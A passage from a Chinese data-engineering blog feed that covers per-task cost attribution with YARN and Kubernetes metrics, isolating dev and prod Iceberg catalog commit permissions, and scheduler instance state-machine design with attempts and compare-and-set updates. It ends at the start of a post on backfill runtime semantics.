<p>只靠任务名匹配不可靠。名称会改、并行补数会重复、测试任务可能复制生产名字。UID 映射要在提交成功时固化，状态回收再补齐 started&#x2F;finished time、queue&#x2F;namespace、node pool 与终止原因。</p>
<p>这条链路还要覆盖失败前的资源。任务创建容器后 OOM、运行两小时后 SQL 报错、反复重试三次，所有 attempt 都应计费。只把最终成功 attempt 记到账本，会把稳定性问题的成本藏掉。</p>
<h2 id="YARN-的-resource-seconds-是分配量，不是-CPU-使用率"><a href="#YARN-的-resource-seconds-是分配量，不是-CPU-使用率" class="headerlink" title="YARN 的 resource-seconds 是分配量，不是 CPU 使用率"></a>YARN 的 resource-seconds 是分配量，不是 CPU 使用率</h2><p>Hadoop YARN 3.3.4 的 <code>ApplicationResourceUsageReport</code> 提供 memory-seconds 和 vcore-seconds。源码注释定义得很清楚：它们是应用已分配内存 MB &#x2F; vcores 乘运行秒数的累计值。</p>
<p>例如一个应用分配 10 vcores 运行 600 秒，得到 6000 vcore-seconds，不代表 CPU 真忙了 6000 core-seconds。任务大部分时间等待 IO，计入的分配成本仍然存在，因为资源调度器在这段时间为它保留容量。</p>
<p>我会同时保存 allocated 与 actual 两套指标。allocated 用来做内部资源成本与队列容量归因；actual CPU time、RSS、network&#x2F;disk IO 用来判断效率。两者的差值是 right-sizing 线索，不应偷偷用 actual 替换 allocated，让账单看起来更低。</p>
<p>YARN 的 <code>resourceSecondsMap</code> 还能容纳自定义资源。若集群有 GPU 或其他资源类型，账本不能把所有东西都折成 vcore。原始 resource name、quantity-seconds 与计价版本要保留，方便日后重新定价。</p>
<h2 id="Kubernetes-要区分-request、limit-和-usage"><a href="#Kubernetes-要区分-request、limit-和-usage" class="headerlink" title="Kubernetes 要区分 request、limit 和 usage"></a>Kubernetes 要区分 request、limit 和 usage</h2><p>Kubernetes <code>ResourceRequirements</code> 把 requests 定义为所需的最小计算资源，limits 定义允许的最大量。Scheduler 按 requests 做放置，运行期实际使用可能低于 request，也可能在 limit 内突发。</p>
<p>对于共享集群，我会提供三种视图：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">capacity cost：request × duration，反映占用的可调度容量</span><br><span class="line">usage cost：actual usage × time，反映真实消耗</span><br><span class="line">risk headroom：limit/request 与峰值，反映超卖和 OOM 风险</span><br></pre></td></tr></table></figure>

<p>只按 usage 分摊，request 配得过大的团队不用为挤占容量负责；只按 request，又看不出运行效率。平台可以选择 request 做 chargeback、usage 做优化分析，但要把规则公开，不能在月中换口径。</p>
<p>Pod 生命周期也要处理准确。Pending 但尚未调度的 Pod 没占 Node 计算资源，Running 容器才积累；终止重建后按各 Pod UID 分段；sidecar 和 init container 的成本是否算入任务，要有一致规则。Job 删除前应先把资源与标签数据固化。</p>
<h2 id="存储成本要按-bytes-days，而不是当前大小"><a href="#存储成本要按-bytes-days，而不是当前大小" class="headerlink" title="存储成本要按 bytes-days，而不是当前大小"></a>存储成本要按 bytes-days，而不是当前大小</h2><p>一张表今天占 10 TB，不能直接把整月存储费用按 10 TB 计算。分区逐日增长、过期删除、快照保留和临时目录都会改变占用。更合理的基础单位是 bytes-hours 或 bytes-days。</p>
<p>表格式还要区分逻辑数据量与物理占用。Iceberg 历史 snapshots 会继续引用旧 data files；compaction 在新旧 snapshot 共存期间短暂产生双份文件；orphan files 不在当前表大小里，却仍占对象存储。账本应从存储 inventory 或内容摘要采集物理 bytes，再用 metadata 关系归到表、snapshot&#x2F;maintenance job。</p>
<p>共享 warehouse 里无法归属的路径进入 <code>unallocated_storage</code>，不能悄悄按表当前大小比例分摊。unallocated 持续增长本身就是治理指标，说明路径、owner 或清理流程缺失。</p>
<p>缓存、副本和跨可用区复制也要算。业务表逻辑 1 TB、三副本物理 3 TB，chargeback 是按逻辑数据鼓励平台承担副本，还是按物理数据让业务感知可靠性成本，需要提前定义。两种都可以，关键是不能混用。</p>
<h2 id="网络与外部服务不能永远藏在平台公摊"><a href="#网络与外部服务不能永远藏在平台公摊" class="headerlink" title="网络与外部服务不能永远藏在平台公摊"></a>网络与外部服务不能永远藏在平台公摊</h2><p>跨区读写、对象存储请求、Kafka 流量、日志索引和外部 API 都可能成为大头。按 CPU&#x2F;memory 分摊这些成本，会把网络密集任务的费用错误地转嫁给计算密集任务。</p>
<p>能直接关联 instance ID 的请求按使用量归因；只能拿到 namespace&#x2F;bucket&#x2F;topic 维度的，先归到项目；控制面、监控和空闲节点属于 shared cost，再按公开规则分配。共享成本必须单列，让使用方能看见“直接成本”和“平台公共成本”。</p>
<p>单价也要版本化。节点按需价、包年包月折算、Spot 折扣、存储层级和网络方向都会变化。每条成本记录引用 <code>price_snapshot_id</code>，而不是查询报表时拿今天价格乘历史用量。这样财务对账与技术模拟可以共存。</p>
<h2 id="成本报表要同时展示价值和失败"><a href="#成本报表要同时展示价值和失败" class="headerlink" title="成本报表要同时展示价值和失败"></a>成本报表要同时展示价值和失败</h2><p>成本最高的任务不一定最该优化。一个核心日结任务每天稳定处理全公司订单，贵但有价值；一个没人消费的临时报表每次只花几十元，却运行上万次，浪费更明显。</p>
<p>我会给任务提供四类指标：总成本、每成功批次成本、每 GB 输入&#x2F;每百万行成本、失败与重试成本。再关联下游消费者、SLA 和最后访问时间。这样能区分“量大所以贵”“单位效率差”“稳定性差导致贵”“已经没人用还在贵”。</p>
<p>优化动作也要能回归。调小 request 后，比较单位成本、排队时间和 OOM；减少 Spark partitions 后，检查 runtime 与 shuffle；调整文件布局后，检查查询扫描量与维护成本。只看到本月下降，可能是业务数据少了，不是优化有效。</p>
<p>预算告警则基于实例预测。补数提交前，根据历史同类分区的 resource-seconds 和 bytes 估算费用，超过阈值先展示影响，而不是月底发现账单翻倍。预测区间要带置信度，不能给一个假精确数字。</p>
<h2 id="先做-Showback，再做-Chargeback"><a href="#先做-Showback，再做-Chargeback" class="headerlink" title="先做 Showback，再做 Chargeback"></a>先做 Showback，再做 Chargeback</h2><p>第一阶段我建议只展示不扣费。让 owner 核对任务映射、资源口径和共享分摊，解决 missing owner、重复 application、时区与价格问题。归因准确率不到 95% 就直接 chargeback，会把团队精力消耗在争账单上。</p>
<p>Showback 稳定后，再为可控资源做配额和预算。费用异常能点到 instance、attempt、Pod&#x2F;application 与原始指标，用户才能自助验证。平台也要公布无法精确归因的边界，不把估算伪装成计量事实。</p>
<p>数据平台成本治理最终要推动工程动作：减少无效重跑、修正资源申请、调整文件与模型、下线无人消费任务。能追到任务实例的账本，才有资格支撑这些决定；部门总账只能告诉我们钱花了，不能告诉我们为什么花。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/hadoop/blob/a585a73c3e02ac62350c136643a5e7f6095a3dbb/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-api/src/main/java/org/apache/hadoop/yarn/api/records/ApplicationResourceUsageReport.java#L89-L123">Hadoop 3.3.4 <code>ApplicationResourceUsageReport</code>：used、reserved、needed resources</a></li>
<li><a href="https://github.com/apache/hadoop/blob/a585a73c3e02ac62350c136643a5e7f6095a3dbb/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-api/src/main/java/org/apache/hadoop/yarn/api/records/ApplicationResourceUsageReport.java#L125-L159">Hadoop 3.3.4：memory-seconds 与 vcore-seconds 的定义</a></li>
<li><a href="https://github.com/apache/hadoop/blob/a585a73c3e02ac62350c136643a5e7f6095a3dbb/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-api/src/main/java/org/apache/hadoop/yarn/api/records/ApplicationResourceUsageReport.java#L233-L240">Hadoop 3.3.4：通用 resourceSecondsMap</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/blob/4ce5a8954017644c5420bae81d72b09b735c21f0/staging/src/k8s.io/api/core/v1/types.go#L2270-L2282">Kubernetes 1.24 <code>ResourceRequirements</code>：limits 与 requests 的 API 语义</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/blob/4ce5a8954017644c5420bae81d72b09b735c21f0/staging/src/k8s.io/apimachinery/pkg/apis/meta/v1/types.go#L217-L228">Kubernetes 1.24 <code>ObjectMeta</code>：可组织、分类和筛选资源的 labels</a></li>
</ul>
]]></content>
      <categories>
        <category>资源治理</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
        <tag>成本治理</tag>
        <tag>Apache YARN</tag>
      </tags>
  </entry>
  <entry>
    <title>多环境 Catalog 为什么必须隔离提交权限：同名表不是同一个对象</title>
    <url>//2022/09/18/catalog-environment-isolation/</url>
    <content><![CDATA[<p>开发和生产都存在 <code>sales.orders</code> 时，最危险的不是用户查错表，而是一个带生产凭证的测试任务真的把生产 metadata pointer 提交成功。SQL 语句、表名和 schema 全都合法，事故不会在 parser 或 type checker 阶段被拦住。</p>
<p>多环境 Catalog 隔离不能只靠名称前缀。<code>dev_catalog</code> 和 <code>prod_catalog</code> 如果背后连的是同一个 Metastore、同一个 warehouse，并且作业拿到同一套写凭证，前缀只是提醒，不是安全边界。我要求名称、控制面、存储位置和执行身份四层同时隔离。</p>
<p class="article-diagram-scroll"><img src="/images/articles/catalog-environment-isolation.svg" class="lazyload" data-srcset="/images/articles/catalog-environment-isolation.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="开发与生产 Catalog 的控制面和提交身份隔离"></p>
<span id="more"></span>

<h2 id="Catalog-名称会被省略，不能当最后防线"><a href="#Catalog-名称会被省略，不能当最后防线" class="headerlink" title="Catalog 名称会被省略，不能当最后防线"></a>Catalog 名称会被省略，不能当最后防线</h2><p>Iceberg 0.14.1 在 Spark 中通过 <code>spark.sql.catalog.&lt;name&gt;</code> 注册 Catalog，可以配置 Hive Metastore URI、Hadoop warehouse、默认 namespace 和 per-catalog Hadoop 参数。SQL 可以写完整的 <code>hive_prod.db.table</code>，也可以 <code>USE hive_prod.db</code> 后只写 <code>table</code>。</p>
<p>这意味着当前 Catalog 与 namespace 是 session state。复制一段 SQL 到另一个 Notebook、连接池复用 Session、初始化语句失败，未限定名称的 <code>INSERT INTO orders</code> 就可能落到不同对象。代码 review 里看到表名正确，也无法证明运行时 current catalog 正确。</p>
<p>我会要求生产写操作使用三段式完整标识，并在提交前解析一次实际 table UUID、metadata location 和 warehouse 前缀。读取可以根据平台体验允许短名称，create&#x2F;drop&#x2F;alter&#x2F;overwrite 则必须显式 Catalog。</p>
<p>但完整名称仍然不是权限。开发身份即使写出 <code>prod_catalog.sales.orders</code>，后端也应拒绝；依赖“工程师不会这样写”只是把边界交给习惯。</p>
<h2 id="四层隔离分别解决什么"><a href="#四层隔离分别解决什么" class="headerlink" title="四层隔离分别解决什么"></a>四层隔离分别解决什么</h2><p>第一层是命名隔离。Catalog 名必须包含稳定环境语义，不能用 <code>default</code>、<code>hive</code> 这种容易在各处重定义的名称。平台把 environment 作为结构化属性，不从字符串猜测。</p>
<p>第二层是 metadata control plane。生产与非生产最好使用不同 Metastore&#x2F;Catalog service，至少使用明确隔离的数据库、租户或 namespace，并验证底层实现真的提供权限边界。同一个 HMS 上只换 database 名，在拿到全局 HMS 权限的客户端面前仍然很脆弱。</p>
<p>第三层是 storage。<code>prod</code> 与 <code>dev</code> warehouse 使用不同根路径、bucket 或账号，存储策略拒绝开发角色写生产前缀。这样即使 Catalog 层配置错误，创建 metadata&#x2F;data file 也会失败。</p>
<p>第四层是 identity。生产 writer 由调度&#x2F;发布系统按任务下发短期身份，只允许目标 namespace 和必要动作；开发 Notebook 没有生产 commit&#x2F;drop&#x2F;delete 权限。不要把长期 AccessKey 写进公共 <code>core-site.xml</code> 或镜像。</p>
<p>这四层相互补位。只有存储隔离，没有 Catalog 隔离，开发任务可能改生产表指针到一个自己能写的错误位置；只有 Catalog ACL，没有存储隔离，泄露的路径凭证仍能绕过表格式直接删文件。</p>
<h2 id="读、写、维护要拆成不同能力"><a href="#读、写、维护要拆成不同能力" class="headerlink" title="读、写、维护要拆成不同能力"></a>读、写、维护要拆成不同能力</h2><p>Iceberg <code>Catalog</code> API 不只有 <code>loadTable</code>，还包含 create、drop、rename、register 以及 transaction。一个“能访问 Catalog”的角色太宽，平台应按动作拆权限。</p>
<p>查询身份只需 load&#x2F;list 与读取 metadata&#x2F;data files。Writer 需要创建 data&#x2F;manifest&#x2F;metadata 文件并提交 table state，但不一定需要 drop。DDL 管理身份可以变更 schema&#x2F;property；维护身份需要 rewrite&#x2F;expire，orphan cleanup 还包含物理删除，风险最高。</p>
<p>我会把 remove orphan、drop table purge、expire snapshots 的删除权限单独收口。日常 writer 不应拥有遍历并批量删除整个 warehouse 的能力。维护任务先生成候选清单，再通过受控执行身份删除。</p>
<p>生产临时授权还要绑定对象范围和有效期。例如发布任务只对 <code>prod.sales.orders</code> 获得 30 分钟 commit 权限，不能因为使用同一个 Spark 集群就能改整个 <code>prod</code> namespace。审计记录 subject、job instance、table UUID、base&#x2F;new metadata location 与授权策略版本。</p>
<h2 id="配置模板必须避免环境参数串线"><a href="#配置模板必须避免环境参数串线" class="headerlink" title="配置模板必须避免环境参数串线"></a>配置模板必须避免环境参数串线</h2><p>同一份 Spark 镜像跑多环境很常见，问题通常出在运行配置拼装。全局 <code>hive-site.xml</code> 指向生产 HMS，开发任务只覆盖了 catalog name，却遗漏 URI；或者 per-catalog S3 endpoint 没注入，客户端退回全局 credentials。</p>
<p>Iceberg 文档说明，Catalog 的 URI 可以省略并回退到 <code>hive.metastore.uris</code>，per-catalog Hadoop 配置会覆盖全局 <code>spark.hadoop.*</code>。这些便利在多环境里也会产生隐式依赖。我会在生产模板禁止关键项留空：catalog implementation、URI、warehouse、FileIO、authentication 都必须显式渲染。</p>
<p>启动自检输出一份不含密钥的 catalog manifest：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">catalog_name, implementation, metastore_uri_hash,</span><br><span class="line">warehouse_uri, file_io, credential_subject, environment</span><br></pre></td></tr></table></figure>

<p>平台将它与任务声明的 environment 比较。<code>environment=dev</code> 却解析到 prod URI&#x2F;warehouse，任务在执行 SQL 前失败。不要等第一条写入验证配置。</p>
<p>密钥也不能跟配置一起日志化。自检只展示 subject&#x2F;role ARN、endpoint 和不可逆 hash，AccessKey、token、Kerberos keytab 内容全部脱敏。隔离审计需要知道“谁”，不需要知道“密码是什么”。</p>
<h2 id="统一治理视图不等于统一提交入口"><a href="#统一治理视图不等于统一提交入口" class="headerlink" title="统一治理视图不等于统一提交入口"></a>统一治理视图不等于统一提交入口</h2><p>企业希望在一个数据目录中搜索 dev&#x2F;test&#x2F;prod 资产，这没有问题。元数据治理层可以只读采集各 Catalog，把环境、Catalog、namespace 和 table identity 一起索引，再建立跨环境的发布&#x2F;派生关系。</p>
<p>危险的是为了“统一体验”，让一个中心服务持有所有环境写凭证，并代理任意 Catalog 操作。它会成为权限放大器：上游只传一个 table name，中心服务替它完成生产提交，业务身份边界消失。</p>
<p>更稳妥的方式是统一 control UI，但执行使用目标环境的 scoped identity。发布动作从 dev schema 生成 prod 变更计划，经过审批后由 prod executor 执行；中心层保存意图和审计，不把一把全局万能密钥下发给调用者。</p>
<p>跨环境复制也应创建新的 table identity。dev 与 prod 表可以有相同逻辑名称和 schema，却拥有不同 table UUID、metadata location 与生命周期。Catalog 中建立 promotion relation，不把两边合成同一物理对象。</p>
<h2 id="用故障注入验证隔离，而不是看配置"><a href="#用故障注入验证隔离，而不是看配置" class="headerlink" title="用故障注入验证隔离，而不是看配置"></a>用故障注入验证隔离，而不是看配置</h2><p>上线前我会主动做负向测试：开发身份 load 生产表应按策略决定是否允许，create&#x2F;append&#x2F;alter&#x2F;drop 必须拒绝；伪造 prod catalog name 指向 dev URI 应被 manifest 检查发现；生产 writer 尝试写 namespace 外对象应失败；维护身份过期后删除应失败。</p>
<p>同时检查失败发生在哪一层。Catalog ACL 拒绝是预期第一道；如果它配置失效，存储 policy 仍应拒绝。两层都通过才说明隔离不是纸面配置。</p>
<p>运行中监控跨环境 URI、异常 current catalog、dev subject 访问 prod endpoint、短时间批量 DDL 和 metadata location 跳出 warehouse 前缀。一次 commit 成功不等于合法，策略审计必须与表提交日志关联。</p>
<p>多环境隔离的目标不是让名称更规整，而是把误操作限制在它所属的环境。开发 SQL 再像生产，使用的身份和控制面也不应具备改变生产状态的能力。做到这一点，统一 Catalog 才能既方便搜索，又不牺牲提交边界。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-configuration.md#L28-L49">Iceberg 0.14.1 Spark Configuration：HiveCatalog 与 HadoopCatalog 的独立配置</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-configuration.md#L55-L76">Iceberg 0.14.1 Spark Configuration：Catalog URI、warehouse、default namespace 与 cache</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-configuration.md#L79-L94">Iceberg 0.14.1 Spark Configuration：current catalog&#x2F;namespace 可以省略</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/docs/spark-configuration.md#L109-L115">Iceberg 0.14.1 Spark Configuration：per-catalog Hadoop 配置覆盖全局参数</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/api/src/main/java/org/apache/iceberg/catalog/Catalog.java#L33-L151">Iceberg 0.14.1 <code>Catalog</code> API：create、load 与 table transaction 的能力面</a></li>
<li><a href="https://github.com/apache/iceberg/blob/71d918e781eff70c2c2a21aea7289daad61c8afe/hive-metastore/src/main/java/org/apache/iceberg/hive/HiveTableOperations.java#L223-L312">Iceberg 0.14.1 <code>HiveTableOperations</code>：表级锁、提交与未知状态检查</a></li>
</ul>
]]></content>
      <categories>
        <category>数据治理</category>
      </categories>
      <tags>
        <tag>Apache Iceberg</tag>
        <tag>Catalog</tag>
        <tag>权限隔离</tag>
      </tags>
  </entry>
  <entry>
    <title>调度实例状态机怎么设计：Queued、Running 与 Lost 不能靠一个字段猜</title>
    <url>//2022/11/03/scheduler-instance-state-machine/</url>
    <content><![CDATA[<p>调度页面上最容易被低估的是“状态”这一列。很多系统只存等待、运行、成功、失败四个值，再由调度器、执行器、回调接口和人工操作一起修改。刚上线时看不出问题；一旦消息延迟、worker 重启或用户点了重跑，同一个实例会在几秒内来回变色，最后状态与实际进程各说各话。</p>
<p>我设计实例状态机时，先问三个问题：谁有权写这个状态，凭什么证据迁移，迟到事件还能不能改变结论。状态不是 UI 文案，而是控制依赖、重试、资源回收和告警的业务协议。</p>
<p class="article-diagram-scroll"><img src="/images/articles/scheduler-instance-state-machine.svg" class="lazyload" data-srcset="/images/articles/scheduler-instance-state-machine.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="调度实例状态不是一条直线"></p>
<span id="more"></span>

<h2 id="先拆开调度状态和执行状态"><a href="#先拆开调度状态和执行状态" class="headerlink" title="先拆开调度状态和执行状态"></a>先拆开调度状态和执行状态</h2><p><code>SCHEDULED</code>、<code>QUEUED</code>、<code>RUNNING</code> 看起来只是三个连续阶段，背后却属于不同系统。调度器确认依赖满足，把实例标成可提交；executor 接受任务，表示它已进入某个队列；worker 真正启动进程后，才进入运行。</p>
<p>如果平台在调用 executor API 成功后直接写 RUNNING，排队时间会被吞掉。任务等待二十分钟才拿到容器，报表却显示它“运行”了二十一分钟，开发者会去优化 SQL，而真正瓶颈是资源队列。反过来，只凭 worker 回调更新状态，提交后丢消息的实例又可能永远停在 SCHEDULED。</p>
<p>我会给每次迁移记录 <code>from_state</code>、<code>to_state</code>、<code>event_id</code>、<code>actor</code>、<code>event_time</code>、<code>observed_at</code> 和证据引用。当前状态是事件归并后的快照，状态历史才是诊断依据。<code>event_time</code> 表示事情发生的时间，<code>observed_at</code> 表示平台收到它的时间；二者不能混成一个更新时间。</p>
<p>Airflow 2.4.1 的 <code>TaskInstanceState</code> 也区分 SCHEDULED、QUEUED、RUNNING、UP_FOR_RETRY、UP_FOR_RESCHEDULE、DEFERRED 等状态，并在注释中标明部分状态由 scheduler 设置、部分由 task instance 自身设置。细分状态的用途，是在模型里保留控制权边界，远不止多画几个颜色。</p>
<h2 id="Lost-应该表达未知，而不是失败"><a href="#Lost-应该表达未知，而不是失败" class="headerlink" title="Lost 应该表达未知，而不是失败"></a>Lost 应该表达未知，而不是失败</h2><p>worker 心跳消失，只能证明平台暂时联系不上它，不能证明进程已经失败。容器可能仍在运行，完成事件也可能堵在消息队列里。调度器立即标失败并重试，就可能让两个 attempt 同时写同一分区。</p>
<p>我通常增加内部状态 <code>LOST</code> 或 <code>UNKNOWN</code>，并进入对账流程：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">1. 查询 executor 队列是否仍持有任务；</span><br><span class="line">2. 查询 Kubernetes Pod / YARN application 的 UID 与终态；</span><br><span class="line">3. 检查 worker lease 和最后心跳；</span><br><span class="line">4. 检查输出提交标记与完成事件；</span><br><span class="line">5. 超过证据等待窗口后再决定重试或失败。</span><br></pre></td></tr></table></figure>

<p>对账结果可能是三种：执行端确认成功，接受晚到的 SUCCESS；进程已失败，进入 retry&#x2F;failed；执行端从未接单，可以重新提交。只有“看不见心跳”这一个证据时，不应该选择其中任何一个结论。</p>
<p>迟到事件还需要 fencing。每个 attempt 带递增 token，worker 回调必须提交 <code>instance_id + attempt_no + event_id</code>。旧 attempt 在新 attempt 已开始后才上报成功，平台可以保存这个事实，却不能让它覆盖当前 attempt 的结果。否则状态会从 RUNNING 跳回旧 SUCCESS，输出版本也可能倒退。</p>
<h2 id="Retry-是新-attempt，不是把状态改回等待"><a href="#Retry-是新-attempt，不是把状态改回等待" class="headerlink" title="Retry 是新 attempt，不是把状态改回等待"></a>Retry 是新 attempt，不是把状态改回等待</h2><p>失败后把同一行状态从 FAILED 改成 WAITING，会抹掉前一次执行的起止时间、日志位置、退出码和资源消耗。页面只剩最终成功，稳定性指标也会虚高。</p>
<p>正确关系是一个实例有多个 attempts。实例表示 <code>job + run/data interval</code> 的业务执行，attempt 表示一次进程级尝试。每个 attempt 单独保存 executor ID、worker、queued&#x2F;start&#x2F;end time、exit code 和 error category；实例状态由当前 attempt 与重试策略归并。</p>
<p>Airflow 的 <code>TaskInstance</code> 也把 <code>run_id</code>、<code>try_number</code> 纳入执行身份，源码中的 key 由 DAG、task、run、try number 和 map index 组成。开始执行时，它会增加 try number 并把状态改为 RUNNING；进入可重试失败时，又有独立的 UP_FOR_RETRY 状态。这些细节说明“第几次尝试”不能只写在日志文本里。</p>
<p>重试计时同样要显式。<code>retry_at</code> 是策略计算出的下一次允许时间，SCHEDULED 表示依赖和重试时间均已满足。系统重启后可以从数据库恢复定时，而不是依赖内存 timer。用户手工重跑若改变参数或代码，应建立新 Run；只重启相同运行的失败进程，才增加 attempt。</p>
<h2 id="状态迁移必须带条件"><a href="#状态迁移必须带条件" class="headerlink" title="状态迁移必须带条件"></a>状态迁移必须带条件</h2><p>状态机不是允许任意 <code>UPDATE instance SET state=?</code>。例如 QUEUED 到 RUNNING 必须来自当前 attempt 的 worker-start 事件；RUNNING 到 SUCCESS 必须带完成证据；FAILED 到 RUNNING 不应直接发生；人工置成功则是一个单独的 override 事件，需要操作者、理由和影响范围。</p>
<p>数据库更新要做 compare-and-set：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> task_attempt</span><br><span class="line"><span class="keyword">SET</span> state <span class="operator">=</span> <span class="string">&#x27;RUNNING&#x27;</span>, started_at <span class="operator">=</span> :event_time, version <span class="operator">=</span> version <span class="operator">+</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">WHERE</span> id <span class="operator">=</span> :attempt_id</span><br><span class="line">  <span class="keyword">AND</span> state <span class="operator">=</span> <span class="string">&#x27;QUEUED&#x27;</span></span><br><span class="line">  <span class="keyword">AND</span> version <span class="operator">=</span> :expected_version;</span><br></pre></td></tr></table></figure>

<p>受影响行数为零，不代表直接重试写库，而是说明状态已被别的事件推进，需要重新读取并判断这个事件是重复、迟到还是冲突。事件 ID 做幂等，状态 version 防止并发覆盖，两层都要有。</p>
<p>取消也不是一个瞬时动作。用户发出 cancel request 后，平台先进入 CANCELLING，向 executor 发送终止请求，等执行端确认后才是 CANCELLED。超时则进入需要对账的 UNKNOWN&#x2F;CANCEL_FAILED。直接显示“已停止”会让用户误以为资源和写入都已终止。</p>
<h2 id="DAG-Run-的成功不等于所有-Task-都成功"><a href="#DAG-Run-的成功不等于所有-Task-都成功" class="headerlink" title="DAG Run 的成功不等于所有 Task 都成功"></a>DAG Run 的成功不等于所有 Task 都成功</h2><p>工作流终态通常由叶子节点决定，而不是简单统计所有 Task。分支任务会产生 SKIPPED，某些失败可能被容错节点吸收，清理节点又可能把图的叶子变成 SUCCESS。平台若只算 <code>failed_count == 0</code>，会误判合法的分支；只看最后一个节点，也可能让错误被掩盖。</p>
<p>Airflow 2.4.1 的 <code>DagRun.update_state()</code> 会先区分 unfinished、finished 和 schedulable Task Instances，再检查 DAG leaves：叶子存在 failed&#x2F;upstream_failed 时 Run 失败，叶子全部位于 success states 时 Run 成功；如果任务未完成却没有可运行项，还会按 deadlock 处理。这套规则值得参考，但业务平台还需要补一层“数据是否发布”的状态。</p>
<p>我倾向于分开 <code>execution_state</code> 与 <code>publication_state</code>。所有 Task 执行成功，只说明计算流程结束；质量检查、元数据提交或分区切换未完成时，结果仍不可消费。下游依赖只认 publication success，运维页面同时展示两者，避免一个绿色 DAG Run 掩盖发布失败。</p>
<h2 id="指标要从迁移时间算，不从最终行算"><a href="#指标要从迁移时间算，不从最终行算" class="headerlink" title="指标要从迁移时间算，不从最终行算"></a>指标要从迁移时间算，不从最终行算</h2><p>有完整状态事件后，排队时长是 RUNNING.event_time - QUEUED.event_time，依赖等待是 SCHEDULED - CREATED，实际执行是 terminal - RUNNING。仅用当前记录的 create&#x2F;update time，所有阶段都被压成一个模糊 duration。</p>
<p>告警也应按状态语义设置。QUEUED 过久查队列和配额；RUNNING 无心跳进入 Lost 对账；UP_FOR_RETRY 过久检查重试定时；SCHEDULED 未提交检查 scheduler&#x2F;executor 接口。统一报“任务卡住”只会把不同责任人拉进同一个群。</p>
<p>上线新状态前，我会先做兼容映射：旧 API 客户端可能只认识 RUNNING&#x2F;FAILED，数据仓库里的报表也可能写死枚举。内部状态可以更细，外部接口按版本聚合；同时保留 raw_state，避免向下兼容时把信息永久丢掉。</p>
<p>调度系统真正难的是让每次迁移有唯一身份、有证据、有所有者，面对重复和乱序事件仍得到同一个结果。状态图只是表达方式。做到这一点，页面的颜色才可信，自动重试和依赖放行才不会变成事故放大器。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/utils/state.py#L25-L71">Apache Airflow 2.4.1：TaskInstance 与 DagRun 状态枚举</a></li>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/models/taskinstance.py#L385-L402">Apache Airflow 2.4.1：TaskInstance 执行身份包含 run_id、try_number 与 map_index</a></li>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/models/taskinstance.py#L1330-L1376">Apache Airflow 2.4.1：TaskInstance 进入执行时增加 try number 并写 RUNNING</a></li>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/models/dagrun.py#L516-L640">Apache Airflow 2.4.1：DagRun 根据叶子任务与 deadlock 计算终态</a></li>
</ul>
]]></content>
      <categories>
        <category>数据开发</category>
      </categories>
      <tags>
        <tag>任务调度</tag>
        <tag>状态机</tag>
        <tag>Apache Airflow</tag>
      </tags>
  </entry>
  <entry>
    <title>补数据为什么不能伪装成正常调度：业务时间、Run 与输出版本</title>
    <url>//2022/10/17/backfill-runtime-semantics/</url>
    <content><![CDATA[<p>补数据最危险的做法，是改一个业务日期参数，然后把它当普通调度实例再跑一遍。页面上只有一个绿色的“成功”，实际发生的事情可能是：旧分区被覆盖了一半、下游提前启动、失败重试又写出一份重复数据，最后谁也说不清当前结果来自哪版代码。</p>
<p>我更愿意把补数据看成一类独立运行，而不是正常调度的快捷入口。它至少要回答四个时间：处理哪段业务数据、何时提出请求、何时真正执行、哪一刻把结果发布给下游。再加一个独立的 <code>run_id</code>，这件事才有可追踪的起点。</p>
<p class="article-diagram-scroll"><img src="/images/articles/backfill-runtime-semantics.svg" class="lazyload" data-srcset="/images/articles/backfill-runtime-semantics.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="补数据运行的四个时间与一个发布闸门"></p>
<span id="more"></span>

<h2 id="业务时间和运行时间必须拆开"><a href="#业务时间和运行时间必须拆开" class="headerlink" title="业务时间和运行时间必须拆开"></a>业务时间和运行时间必须拆开</h2><p>一条处理 10 月 1 日订单的日任务，可能在 10 月 17 日才补跑。<code>2022-10-01</code> 是数据区间，17 日是触发和实际运行时间。把二者都塞进一个 <code>execution_time</code> 字段，日志、SQL 模板、依赖判断和 SLA 就会各自猜它代表什么。</p>
